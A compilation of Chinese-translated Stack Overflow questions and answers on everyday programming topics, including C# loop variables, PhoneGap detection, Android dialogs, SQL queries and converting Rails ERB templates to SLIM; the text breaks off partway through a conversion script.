基本上你需要 5 分钟的时间来理解 Maven 的基本原理，并且可能需要 30 多分钟才能知道如何使用插件来实现你想要的。如果我在 5 年前就知道 Maven，它确实可以节省我数周的时间。

# c# - C#什么更快，在函数开头声明循环变量，还是在每个for循环内？

> ID：10347535
> 
> 赞同：4
> 
> 时间：2012-04-27T08:44:15.147
> 
> 标签：c#, variables, loops, declare

> **可能重复：**
> [在循环之前或循环中声明变量之间的区别？](https://stackoverflow.com/questions/407255/difference-between-declaring-variables-before-or-in-loop)

我一直想知道，这样做是否更快：

```
int i;

for (i=0;i<...)
for (i=0;i<...)
for (i=0;i<...)
for (i=0;i<...) 
```

或者

```
for (int i=0;i<...)
for (int i=0;i<...)
for (int i=0;i<...)
for (int i=0;i<...) 
```

意思是，如果我在一个函数中有多个 for 循环，如果我声明一次循环迭代变量并多次使用它，或者在每个 for 循环中声明它，它会更快吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T09:07:06.410

对于这两种方法，生成的 IL（对于发布版本）几乎相同。

考虑这段代码：

```
static int test1()
{
    int result = 0;
    int i;

    for (i = 0; i < 10; ++i)
        ++result;

    for (i = 0; i < 10; ++i)
        ++result;

    return result;
}

static int test2()
{
    int result = 0;

    for (int i = 0; i < 10; ++i)
        ++result;

    for (int i = 0; i < 10; ++i)
        ++result;

    return result;
} 
```

这将为发布版本生成以下 IL，我将其并排放置以便于比较：

```
test1():                        test2()
{                               {
    .maxstack 2                     .maxstack 2
    .locals init (                  .locals init (
        [0] int32 result,               [0] int32 result,
        [1] int32 i)                    [1] int32 i,
                                        [2] int32 V_2)
    L_0000: ldc.i4.0                L_0000: ldc.i4.0 
    L_0001: stloc.0                 L_0001: stloc.0 
    L_0002: ldc.i4.0                L_0002: ldc.i4.0 
    L_0003: stloc.1                 L_0003: stloc.1 
    L_0004: br.s L_000e             L_0004: br.s L_000e
    L_0006: ldloc.0                 L_0006: ldloc.0 
    L_0007: ldc.i4.1                L_0007: ldc.i4.1 
    L_0008: add                     L_0008: add 
    L_0009: stloc.0                 L_0009: stloc.0 
    L_000a: ldloc.1                 L_000a: ldloc.1 
    L_000b: ldc.i4.1                L_000b: ldc.i4.1 
    L_000c: add                     L_000c: add 
    L_000d: stloc.1                 L_000d: stloc.1 
    L_000e: ldloc.1                 L_000e: ldloc.1 
    L_000f: ldc.i4.s 10             L_000f: ldc.i4.s 10
    L_0011: blt.s L_0006            L_0011: blt.s L_0006
    L_0013: ldc.i4.0                L_0013: ldc.i4.0 
    L_0014: stloc.1                 L_0014: stloc.2 
    L_0015: br.s L_001f             L_0015: br.s L_001f
    L_0017: ldloc.0                 L_0017: ldloc.0 
    L_0018: ldc.i4.1                L_0018: ldc.i4.1 
    L_0019: add                     L_0019: add 
    L_001a: stloc.0                 L_001a: stloc.0 
    L_001b: ldloc.1                 L_001b: ldloc.2 
    L_001c: ldc.i4.1                L_001c: ldc.i4.1 
    L_001d: add                     L_001d: add 
    L_001e: stloc.1                 L_001e: stloc.2 
    L_001f: ldloc.1                 L_001f: ldloc.2 
    L_0020: ldc.i4.s 10             L_0020: ldc.i4.s 10
    L_0022: blt.s L_0017            L_0022: blt.s L_0017
    L_0024: ldloc.0                 L_0024: ldloc.0 
    L_0025: ret                     L_0025: ret 
}                               } 
```

这清楚地表明您应该选择“i”是循环本地的版本，因为这是更好的做法。

但是，在循环外部声明循环计数器的版本将比将 int 初始化为零所需的时间更快 - 几乎可以忽略不计。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-27T08:46:28.020

理论上前者应该更快，因为只有一个内存位置，可以重复使用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-27T08:48:45.570

正如spender所说，这里没有速度问题，更多的是与您需要变量可用的范围有关。如果它只需要在循环中可用，那么在循环中声明它而不是在它之外。但是，如果您需要所有循环都可以使用第一种方法，那么第一种方法会更快。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T09:03:55.177

这两个代码产生相同的 JITted 代码。因此，它确实没有任何性能提升。

# javascript - 将参数传递给xslt中的javascript脚本

> ID：10347536
> 
> 赞同：1
> 
> 时间：2012-04-27T08:44:15.603
> 
> 标签：javascript, html, xslt, parameters

是否可以在脚本位于标签之间的 XSLT 中处理 javascript 函数的参数`<script type=text/javascript>....</script>.`如果可能的话，有人可以举个例子。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:03:50.593

我认为您对这两件事感到困惑：XSLT 是用来（在这种情况下）生成 HTML/javascript 的东西——一旦浏览器接收到生成的 HTML/javascript，就可以运行 javascript。我不知道 XSLT 将变量“传递”给 javascript 函数的任何此类概念。

我的猜测是你想要这样的 XSLT ......

```
<script type="text/javascript">
  var myVar = "<xsl:value-of select="XPATHVALUE"/>";
  <xsl:text disable-output-escaping="yes"><![CDATA[
    function myFunc(){
      alert(myVar);
    }
  ]]></xsl:text>
</script> 
```

如果您将 javascript 的主要“正文”放在 xsl:text 元素中，这意味着您不会使用保留字符（例如 < > 等）被抓到。

设置到浏览器的生成的 HTML/javascript 最终会像这样，这意味着调用 myFunc 将显示“hello world”...

```
<script type="text/javascript">
  var myVar = "hello world";
    function myFunc(){
      alert(myVar);
    }
</script> 
```

**更新**

正如 MichaelKey 强调的那样，上面的 <xsl:text> 元素是不必要的。这应该产生同样的东西......

```
<script type="text/javascript">
  var myVar = "<xsl:value-of select="XPATHVALUE"/>";
  <![CDATA[
    function myFunc(){
      alert(myVar);
    }
  ]]>
</script> 
```

# javascript - 在移动浏览器或 PhoneGap 应用程序之间进行检测

> ID：10347539
> 
> 赞同：60
> 
> 时间：2012-04-27T08:44:25.437
> 
> 标签：javascript, jquery, mobile, cordova

是否可以检测用户是否通过浏览器或使用 JavaScript 的应用程序进行访问？

我正在通过网页和 PhoneGap 应用程序为多个移动操作系统开发一个混合应用程序，目标是：

1.  独立于部署目标使用相同的代码
2.  仅当用户代理是应用程序时才添加 PhoneGap.js 文件

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2012-09-04T02:04:12.663

您可以检查当前 URL 是否包含`http`协议。

```
var app = document.URL.indexOf( 'http://' ) === -1 && document.URL.indexOf( 'https://' ) === -1;
if ( app ) {
    // PhoneGap application
} else {
    // Web page
} 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-04-27T09:42:11.863

想到的快速解决方案是，

```
onDeviceReady 
```

会帮助你。由于此 JS 调用仅由本机桥（objC 或 Java）调用，因此 safari 移动浏览器将无法检测到这一点。因此，您的设备上应用程序（电话间隙）源库将从`onDeviceReady`.

如果 Phonegap 的任何 JS 调用（如 Device.platform 或 Device.name）为 NaN 或 null，那么它显然是一个移动网络调用。

请检查并让我知道结果。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2012-07-08T16:24:15.197

我想出了一种方法来做到这一点，而不是依赖于 deviceready 事件，从而保持网络代码库完整......

使用内置 deviceready 事件的当前问题是，当页面加载时，您无法告诉应用程序：“嘿，这不是在移动设备上运行，无需等待设备准备好开始”。

1.- 在代码的本机部分，例如对于 iOS，在 MainViewController.m 中有一个方法 viewDidLoad，我正在发送一个 JavaScript 变量，稍后我会在 Web 代码中检查该变量，如果该变量在附近，我将等待为我的页面启动代码，直到一切准备就绪（例如，导航器地理位置）

在 MainViewController.m 下：

```
- (void) viewDidLoad
{
    [super viewDidLoad];
    NSString* jsString = [NSString stringWithFormat:@"isAppNative = true;"];
    [self.webView stringByEvaluatingJavaScriptFromString:jsString];
} 
```

2.- index.html 代码如下：

```
function onBodyLoad()
{
    document.addEventListener("deviceready", onDeviceReady, false);
}

function onDeviceReady(){;
    myApp.run();
}

try{
    if(isAppNative!=undefined);
}catch(err){
    $(document).ready(function(){
        myApp.run();
    });
} 
```

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2012-04-27T08:51:27.857

PhoneGap 具有 window.PhoneGap（或在 Cordova 中为 window.cordova 或 window.Cordova）对象集。检查该对象是否存在并施展魔法。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2012-05-13T17:58:27.730

在加载 phonegap 应用程序的 url 的本机调用中，您添加一个参数 target，其值为 phonegap。所以对android的调用变成了这样。

```
super.loadUrl("file:///android_asset/www/index.html?target=phonegap");
```

使用此代码的网站不会使用额外参数调用，因此我们现在在两个部署平台之间有一些不同。
在 javascript 中，我们检查参数是否存在，如果存在，我们为 phonegap/cordova 添加脚本标签。

```
    var urlVars = window.location.href.split('?');
    if(urlVars.length > 1 && urlVars[1].search('target=phonegap') != -1){
        //phonegap 用于通话
        $('head').append('<script src="cordova.js"></script>');
    }

```

**一个小警告**：此方法需要为每个不同的目标移动平台更改 phonegap 中对 index.html 的调用。对于大多数平台，我不熟悉在哪里执行此操作。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2013-11-29T09:24:32.190

我也一直在努力解决这个问题，我知道这是一个旧线程，但我还没有在任何地方看到我的方法，所以我想分享一下，以防它对某人有所帮助。

我在实际用户代理之后设置了一个自定义用户代理：

```
String useragent = settings.getUserAgentString();
settings.setUserAgentString(useragent + ";phonegap"); 
```

这只是添加了 phonegap 字符串，因此其他依赖检测您的移动用户代理的站点仍然可以工作。

然后你可以像这样加载phonegap：

```
if( /phonegap/i.test(navigator.userAgent) ) 
{
//you are on a phonegap app, $getScript etc
} else {
alert("not phonegap");
} 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2013-08-28T01:29:51.893

我这样做的方式是使用一个被仅浏览器版本的cordova.js覆盖的全局变量。在您的主 html 文件（通常`index.html`）中，我有以下依赖于顺序的脚本：

```
 <script>
        var __cordovaRunningOnBrowser__ = false
    </script>
    <script src="cordova.js"></script> <!-- must be included after __cordovaRunningOnBrowser__ is initialized -->
    <script src="index.js"></script> <!-- must be included after cordova.js so that __cordovaRunningOnBrowser__ is set correctly --> 
```

在里面`cordova.js`我有简单的：

```
__cordovaRunningOnBrowser__ = true 
```

在为移动设备构建时，不会使用cordova.js（而是使用特定于平台的cordova.js 文件），因此无论协议、用户代理或库如何，此方法的好处是100% 正确变量（可能会改变）。我可能还应该在 cordova.js 中包含其他内容，但我还不知道它们是什么。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2014-03-13T12:36:53.597

如果您尝试以下操作怎么办：

```
if(window._cordovaNative) {
  alert("loading cordova");
  requirejs(["...path/to/cordova.js"], function () { 
         alert("Finished loading cordova");
  });
} 
```

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2012-05-13T13:29:24.493

一旦 webview 在 Phonegap 应用程序中启动，听起来您正在加载另一个网页，对吗？如果这是真的，那么您可以根据配置向请求 url 添加一个参数。

例如，假设 PHP，

```
App.Config = {
  target: "phonegap"
};

<body onload="onbodyload()">

var onbodyload = function () {
  var target = App.Config.target;
  document.location = "/home?target=" + target;
}; 
```

然后在服务器端，如果目标是 phonegap，则包含 phonegap js。

无法使用用户代理检测差异。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2012-05-09T14:07:19.707

我对 phonegap 应用程序和我们的 Web 客户端使用相同的代码。这是我用来检测 phonegap 是否可用的代码：

```
window.phonegap = false;
$.getScript("cordova-1.7.0.js", function(){
    window.phonegap = true;
}); 
```

请记住，phonegap js 文件是异步加载的。您可以通过设置漂亮的 jquery $.getScript 函数的正确选项来同步加载它。

请注意，即使在您的网络客户端中，该方法也会发出额外的 GET 请求来获取 phonegap js 文件。就我而言，它并没有影响我的网络客户端的性能；所以它最终成为了一种很好/干净的方式来做到这一点。至少在其他人找到一个快速的单线解决方案之前:)

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2014-02-07T16:52:55.837

**简短而有效：**

```
if (document.location.protocol == 'file:') { //Phonegap is present } 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2012-05-11T11:51:19.317

在我看来，你试图为自己制造问题。您没有提到您的开发平台，但它们中的大多数都有不同的部署配置。您可以定义两种配置。并设置指示代码部署方式的变量。在这种情况下，您不需要关心部署应用程序的设备。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2016-02-14T18:28:29.877

类似于[B T 的解决方案](https://stackoverflow.com/a/18478019/5924996)，但更简单：

我的*www*文件夹中有一个空的 cordova.js，它在构建时被 Cordova 覆盖。不要忘记在您的应用程序脚本文件之前包含cordova.js（我花了一个小时才发现我的顺序错误......）。

然后，您可以检查 Cordova 对象：

```
document.addEventListener('DOMContentLoaded', function(){
    if (window.Cordova) {
        document.addEventListener('DeviceReady', bootstrap);
    } else {
        bootstrap();
    }
});

function bootstrap() {
   do_something()
} 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2012-05-11T11:19:52.193

**新解决方案：**

```
var isPhoneGapWebView = location.href.match(/^file:/); // returns true for PhoneGap app 
```

**旧解决方案：**
~~使用 jQuery，像这样运行~~

 ~~```
$(document).ready(function(){
   alert(window.innerHeight);
}); 
```~~ 

以 iPhone 为例为您的移动应用程序，

使用 PhoneGap 或 Cordova 时，您将获得 460px 的 WebView，但在 safari 中，由于浏览器的默认页眉和页脚，您会失去一些高度。

~~如果window.innerHeight等于460，可以加载phonegap.js，调用`onDeviceReady`函数~~

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2016-07-21T10:12:41.370

还没有人提到这一点，但似乎 Cordova 现在支持将浏览器添加为平台：

```
cordova platforms add browser 
```

这将在运行时自动添加带有`onDeviceReady`事件的cordova.js，这样您就不需要伪造它。此外，许多插件都支持浏览器，因此您的代码中不再有浏览器黑客攻击。

要在浏览器中使用您的应用程序，您应该使用`cordova run browser`. 如果要部署它，可以使用与其他平台相同的命令来进行。

编辑：忘了提及[我的来源](https://www.raymondcamden.com/2014/09/24/browser-as-a-platform-for-your-phonegapcordova-apps/)。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2019-02-12T12:02:35.597

解决方案：在 Cordova 中修补 index.html 并添加`cordova-platform="android"`到`<html>`标签中，这样 cordova-platform 属性将仅存在于 Cordova 构建中，并且在用于 Cordova 之外的 Web 的原始 index.html 中缺失。

优点：不依赖用户代理、url 架构或 cordova API。不需要等待 deviceready 事件。可以通过各种方式进行扩展，例如可以包含或不包含cordova-platform="browser"，以便区分Cordova 之外的Web 应用程序与Cordova 的浏览器平台构建。

与 config.xml 合并

```
 <platform name="android">
        <hook src="scripts/patch-android-index.js" type="after_prepare" />
    </platform> 
```

添加文件 scripts/patch-android-index.js

```
module.exports = function(ctx) {
    var fs = ctx.requireCordovaModule('fs');
    var path = ctx.requireCordovaModule('path');

    var platformRoot = path.join(ctx.opts.projectRoot, 'platforms/android');
    var indexPath = platformRoot + '/app/src/main/assets/www/index.html';

    var indexSource = fs.readFileSync(indexPath, 'utf-8');

    indexSource = indexSource.replace('<html', '<html cordova-platform="android"');

    fs.writeFileSync(indexPath, indexSource, 'utf-8');
} 
```

注意：对于非android，路径`platforms/android`和`/app/src/main/assets/www/index.html`应该调整。

应用程序可以检查cordova-platform

```
if (! document.documentElement.getAttribute('cordova-platform')) {
  // Not in Cordova
} 
```

或者

```
if (document.documentElement.getAttribute('cordova-platform') === 'android') {
  // Cordova, Android
} 
```

# java - Android：更改自定义 AlertDialog 背景

> ID：10347545
> 
> 赞同：2
> 
> 时间：2012-04-27T08:44:40.540
> 
> 标签：java, android, android-alertdialog, background-color

对话框布局xml：

```
<?xml version="1.0" encoding="utf-8"?>
<TableLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:id="@+id/root_view"
     android:padding="3dp"
     android:background="@android:color/white"
     android:layout_width="wrap_content"
     android:layout_height="wrap_content" >

     //...content...

 </TableLayout> 
```

点击图钉时地图叠加层中的对话框实现：

```
AlertDialog.Builder builder;

LayoutInflater inflater = (LayoutInflater) context.getSystemService(Service.LAYOUT_INFLATER_SERVICE);
View layout = inflater.inflate(R.layout.map_kap_dialog,
                    (ViewGroup) mapView.findViewById(R.id.root_view));

//prepare info to show...
//info prepared

//other preparations stuff
builder = new AlertDialog.Builder(context);
builder.setView(layout);
dialog = builder.create();
dialog.setInverseBackgroundForced(true);
dialog.setCanceledOnTouchOutside(true);
//show it
dialog.show(); 
```

以及我在测试时看到的：

![在此处输入图像描述](../Images/4c7063a24fbc51359ade89475eec8ef9.png)

所以我希望对话框周围的浅灰色背景（方形空白周围）变为白色，这样看起来就不会那么难看。谁能帮我？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-29T12:17:06.863

我有同样的问题，我设法使用这样的自定义对话框修复它：

```
public class CustomDialog extends Dialog {
    public CustomDialog(Context context, View view) {
        super(context);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(view);
        getWindow().getDecorView().setBackgroundResource(android.R.color.transparent);
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-10T13:42:43.517

嘿，将您的视图设置为 builder 会在顶部底部创建这条灰线，而不是您可以将 setView 设置为您的 dialog.like dialog.setView(layout,0,0,0,0);它将您的布局绑定到整个对话框。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-20T14:00:31.353

另一种选择是`android:background="@android:color/white"`从您的布局中删除。然后警报对话框将统一具有其默认的浅灰色背景。（因为您在黑暗主题上强制反转）至少它看起来不错并且值得麻烦。只是我的两分钱。

# c# - nhibernate的标准方法

> ID：10347549
> 
> 赞同：0
> 
> 时间：2012-04-27T08:45:00.840
> 
> 标签：c#, asp.net, hibernate, nhibernate, criteria

有没有办法给方法一个标准，然后从代码中运行它？例如

```
 public static List<T> ToList(ICriteria criteria)
    {
        ISession session = NhSessionHelper.GetCurrentSession();
        List<T> l = session.+criteria;
        return l;
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:46:20.523

你可以为它 DetachedCriteria ：

```
public static List<T> ToList(DetachedCriteria criteria)
{
    ISession session = NhSessionHelper.GetCurrentSession();
    List<T> l = criteria.GetExecutableCriteria(session).List<T>();
    return l;
} 
```

# mysql - 如何避免不同

> ID：10347552
> 
> 赞同：6
> 
> 时间：2012-04-27T08:45:12.153
> 
> 标签：mysql, sql, distinct

我有一个在使用 DISTINCT 时有效的查询。但是我有一种感觉，我可以以一种有助于我避免使用 DISTINCT 的方式重写查询，这将使数据库更容易（更快）处理查询。

如果重写查询没有意义，请解释一下，如果有，请查看简化查询并提示我如何重新编写它，这样我就不会首先得到重复。

```
SELECT Us.user_id, COUNT( DISTINCT Or.order_id ) AS orders
FROM users AS Us
LEFT JOIN events AS Ev ON Ev.user_id = Us.user_id
LEFT JOIN orders AS Or ON Or.event_id = Ev.event_id
OR Or.user_id = Us.user_id
GROUP BY Us.user_id 
```

查询的简短描述：我有一张用户表，其中包含他们的事件和订单。有时订单有列 user_id，但大多数情况下它是空的，它们必须通过事件表连接。

编辑：

这些是我编写的简化查询的结果，首先没有 distinct，然后包括 distinct。

```
user_id orders
3952    263
3953    7
3954    2
3955    6
3956    1
3957    0
...

user_id orders
3952    79
3953    7
3954    2
3955    6
3956    1
3957    0
... 
```

问题已解决：

```
SELECT COALESCE( Or.user_id, Ev.user_id ) AS user, COUNT( Or.order_id ) AS orders
FROM orders AS Or
LEFT JOIN events AS Ev ON Ev.event_id = Or.event_id
GROUP BY COALESCE( Or.user_id, Ev.user_id ) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T10:19:43.370

如果一个订单可以与多个事件关联，或者一个用户与一个事件关联多次，那么同一个订单就有可能与同一个用户关联多次。在这种情况下， using`DISTINCT`将只为每个用户计算一次该订单，而忽略它将为与用户的每个关联计算一次该订单。

如果您追求前者，那么您现有的查询是您的最佳选择。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T11:04:22.903

您没有从用户表或事件表中得到任何东西，所以为什么要加入它们。您的最后一个“OR”子句明确引用它有一个 user_ID 列。我希望你的订单表有一个关于下订单的用户 ID 的索引，那么你可以这样做

```
select
      user_id,
      count(*) as Orders
   from
      orders
   group by
      user_id 
```

# sql-server - 关于将数据从一个数据库传输到另一个数据库的建议，语法

> ID：10347556
> 
> 赞同：1
> 
> 时间：2012-04-27T08:45:19.337
> 
> 标签：sql-server

我对 SQL Server 相当陌生。我已经完成了基本的管理、备份等工作。我还花了 2 年时间为一家软件公司做 MySQL，为他们的 MySQL 定制程序提供软件支持。我主要是一个技术人员（桌面，网络），但我对这个数据库的东西很感兴趣！

我从一家运行 SQL Server 2005 的公司开始，需要做一些事情，而且我在语法上比任何事情都苦苦挣扎。该公司有 4 个 SQL Server 为 4 个不同的位置运行相同的数据库（程序方面）。

我要做的是将更新后的成本价目表从表 1 复制到具有 * 标准的其他表中。基本上`table.parts`从复制`server1.parts`到`server2.parts * currencyconvertion field * markup (%)`

那一点似乎很容易，除非我无法链接数据库。我输入的服务器名称包含 - 并且语法错误，例如`uk-server1 'can't find 'uk'`？另外我不确定 4 部分地址是否正确的服务器名、数据库名、模式、表？

对了。以前尝试时我无法链接两台服务器。我现在已经解决了这个问题，服务器现在已链接。有人告诉我，可能需要 [] 引用''服务器名称。我试过这个没有成功。问题似乎是具有 - uk-efacs 的服务器的名称。一旦我输入这个并记住它现在已链接，错误是找不到服务器 efacs 一个英国是错误的？还没有准备好完整的服务器名称？为什么？

通过反复试验发现这一点只需要 [] 通过服务器名称，即 [uk-efacs].db.table.field。现在可以了，只需要处理我的语法，因为查询显示错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T10:43:24.437

Try creating a Linked Server record on the server you're running this from. In Object Explorer (in SSMS) expand Server Objects, right click Linked Servers and select new. Select SQL Server and type the name of your remote server and then try your query again. Bit puzzled as the snippet you provided

```
update partmaster 
set partmaster.fsunit = uk-efacs.efacsdb.partmaster.fsunit * uk-efacs.efacsdb.currency.currate * 1.32 
```

Seems to parse just fine.

# android - 具有近似字符串匹配的Android autocompletetextview

> ID：10347563
> 
> 赞同：0
> 
> 时间：2012-04-27T08:45:50.973
> 
> 标签：android, autocompletetextview, string-search

我正在开发一个应用程序，其中包含大约 8000 个印度城市的名称。当用户输入时，我使用自动完成来帮助用户完成工作。但是一些城市名称的拼写对于其他州的人来说很难猜到。所以我们需要一个近似的字符串匹配来自动完成，而不是默认的精确匹配。

例如有像这样的名字

*   蒂鲁马伊莱
*   蒂鲁内图尔
*   蒂鲁图赖尤尔
*   蒂鲁瓦鲁

并且

*   蒂鲁内尔维利
*   蒂鲁曼加兰

如果用户搜索城市“Tirunelveli”但在文本框中键入“Thirunel”，则自动完成文本视图不会显示名称，并且会进行精确的字符串匹配。

我应该怎么做才能在自动完成下拉列表中获得近似匹配的字符串..

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-27T08:59:16.327

您需要创建一个带有自定义过滤器的自定义 ArrayAdapter（该过滤器基于[Lexographic 距离](http://en.wikipedia.org/wiki/Hamming_distance)小于某个阈值（例如 3）），您需要在`getFilter()`适配器的方法中返回该过滤器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-14T05:34:30.130

经过大量搜索和实验，我自己找到了解决方案..

要进行自定义字符串匹配，我们需要一个自定义数组适配器，我们需要[扩展 ArrayAdapter 类](https://stackoverflow.com/questions/10379261/extending-arrayadapter-in-android)并编写我们自己的字符串匹配算法。

我们需要`getFilter`为此功能覆盖 ArrayAdapter 类的方法，`getItem`并将`getCount`方法添加到我们的自定义适配器类。

# c++ - 有大数据容器的基准吗？

> ID：10347566
> 
> 赞同：6
> 
> 时间：2012-04-27T08:45:58.213
> 
> 标签：c++, stl, containers, large-data

我目前正在寻找一种处理大型数据集的方法。

似乎经常推荐使用 stxxl 解决方案，但是在做出决定之前我需要了解更多信息。

问题是

1.  STXXL 是完全平台中立的吗？

2.  有什么选择吗？

3.  关于大型数据库的任何基准？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T10:07:40.593

1) 我在 Windows 和 Linux 上都亲自尝试过，没有理由不应该在 Mac 上编译。我不知道你所说的**中立**是什么意思。

2) 还有一些替代品，如 TPIE、LEDA-SM 等，不再开发。我认为 STXXL 是您最好的选择，因为它支持 PDM（并行磁盘模型）。

# php - 从表中选择一系列行

> ID：10347568
> 
> 赞同：1
> 
> 时间：2012-04-27T08:46:23.657
> 
> 标签：php, mysql, sql

我对 PHP 和 MySQL 很陌生。我正在尝试编写一个 php 脚本，但我坚持从表中选择行

效果很好的代码是：

```
$q_pages = $wpdb -> prefix . 'q_pages_table';

$q_kws = $wpdb->prefix . 'q_kws_table';

$sql = 'SELECT a1.post_id, a1.kw_id, a2.kw_name ' +
       'FROM ' . $q_pages . ' as a1 ' +
       'LEFT JOIN ' . $q_kws . ' as a2 ON (a1.kw_id = a2.id)' + 
       'WHERE a1.draft_id = 4'; 
```

第三个命令是从变量 $q_kws 中选择列并将列连接到变量 $q_pages 如果在 2 个表中的 kw_id 和 id 之间存在匹配并且当 draft_id = 4 时

由于 $sql 变量中有大量行（3000 行），我想将 $sql 分解为 3 个变量，每个变量包含 1000 行，以便稍后我可以分别处理每个变量。

有什么建议吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:55:37.437

要选择特定范围，您必须`limit [start number], [# to select]`在您的情况下使用，您可以选择前 1000 行，例如：

```
select [your select stuff]
limit 0, 1000 
```

第二个是：

```
select [your select stuff]
limit 1000, 1000 
```

第三个是

```
select [your select stuff]
limit 2000, 1000 
```

限制中的第一个数字是它开始的行，第二个数字是该行之后（包括该行）将被选中的行数

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:57:08.277

```
You can use limit in the query to retrieve a specific number of rows .

something like 
$start=0;
$end=1000;

$sql = 'SELECT a1.post_id, a1.kw_id, a2.kw_name ' +
       'FROM ' . $q_pages . ' as a1 ' +
       'LEFT JOIN ' . $q_kws . ' as a2 ON (a1.kw_id = a2.id)' + 
       'WHERE a1.draft_id = 4 limit ".$start.",".$end."'; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T08:58:38.123

例如：

```
select * from table where rownum < 1000 
```

# ruby-on-rails - 将 ERB 模板转换为 SLIM

> ID：10347572
> 
> 赞同：11
> 
> 时间：2012-04-27T08:46:30.680
> 
> 标签：ruby-on-rails, slim-lang

我的许多视图都是 SLIM 模板，我希望将`vote_form`部分视图添加到我的应用程序中。如何将此部分视图从 ERB 转换为 SLIM？

```
<strong class="result">Votes: <%= voteable.votes_for - voteable.votes_against %></strong>
<%= form_tag user_votes_path(current_user) do |f| %>
  <%= radio_button_tag :thumb_direction, :up %>
  <%= radio_button_tag :thumb_direction, :down %>
  <%= hidden_field_tag :voteable, @voteable %>
  <%= submit_tag :vote %>
<% end %> 
```

谢谢 ：）

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2013-01-24T16:26:35.683

# 如何将您的 .erb 转换为 .slim ：

# 更新 (18-08-2015)

您可以简单地使用[html2slim](https://rubygems.org/gems/html2slim) gem

```
gem install html2slim 
```

这个软件包包括一个名为的工具`erb2slim`，它可以递归地将 erb 文件转换为 slim。转换完成后删除 erb 文件的选项`-d`。

```
erb2slim -d <dir of your views> 
```

[在设计 wiki 上查看](https://github.com/plataformatec/devise/wiki/How-To:-Create-Haml-and-Slim-Views)

# 原始答案

你必须通过*HAML*！

在您的环境或 gemset 上安装*HAML*依赖项

```
gem install html2haml # This was moved out of haml gem
gem install ruby_parser 
```

切换到*HAML*模板

```
find . -name '*erb' | \
xargs ruby -e 'ARGV.each { |i| puts "html2haml -r #{i} #{i.sub(/erb$/,"haml")}"}' | \
bash 
```

安装*SLIM*工具依赖

```
gem install haml2slim # https://github.com/fredwu/haml2slim 
```

切换到*SLIM*模板

```
find . -name '*haml' | \
xargs ruby -e 'ARGV.each { |i| puts "haml2slim #{i} #{i.sub(/haml$/,"slim")}"}' | \
bash 
```

清理*ERB*和*HAML*模板

```
find . -name '*erb' -exec rm -f {} \;
find . -name '*haml' -exec rm -f {} \; 
```

删除依赖项

```
gem uninstall html2haml
gem uninstall ruby_parser
gem uninstall haml2slim 
```

就这些，玩得开心

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-11-24T02:49:53.113

在这里，只需粘贴 erb 代码并点击“开始”：
[http ://html2slim.herokuapp.com/](http://html2slim.herokuapp.com/)

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-09-27T09:25:41.530

这是基于@Joel 的精彩回答。我不得不对其进行一些修改，因为一些宝石似乎已经移动，并且我进行了一些其他改进：

*   这是一个脚本，所以只需复制粘贴
*   最后不要删除 gem，因为我可能会在下一个项目中需要它（例如，当我创建设计的视图时）
*   `gem install ...`然后可以发出该部分以进行更快的处理。

### 转换文件

**更新**：不再需要通过 haml 进行转换。这是更新的脚本：

```
#### gem install html2slim # this will install `erb2slim` command line tool.
find . -name '*erb' | \
xargs ruby -e 'ARGV.each { |i| puts "erb2slim #{i} #{i.sub(/erb$/,"slim")}"}' | \
bash

# Clean ERB templates
find . -name '*erb' -exec rm -f {} \;
git add app/views/*
git commit -m "Replace erb with slim" 
```

### 结果

在我的示例中（运行后`rails g devise:views`），所有`.erb`文件都被替换为`.slim`文件，然后被删除：

![截屏](../Images/9d25934be5dbb49c4168524baa01b80c.png)

### 单个文件的替代方案

有时我只是想转换一个剪断。就像之前提到的那样。在这种情况下，我使用

[https://html2slim.herokuapp.com](https://html2slim.herokuapp.com)

![html2slim-in-action](../Images/40f87070fb868aa22983e3d98bfd3700.png)

### 旧方法

所以我们开始：

```
# You must pass through HAML !
# Install HAML dependencies on your environment or your gemset
gem install haml html2haml hpricot ruby_parser haml2slim

# Switch to HAML templating
find . -name '*erb' | \
xargs ruby -e 'ARGV.each { |i| puts "html2haml -r #{i} #{i.sub(/erb$/,"haml")}"}' | \
bash

#Switch to SLIM templating
find . -name '*haml' | \
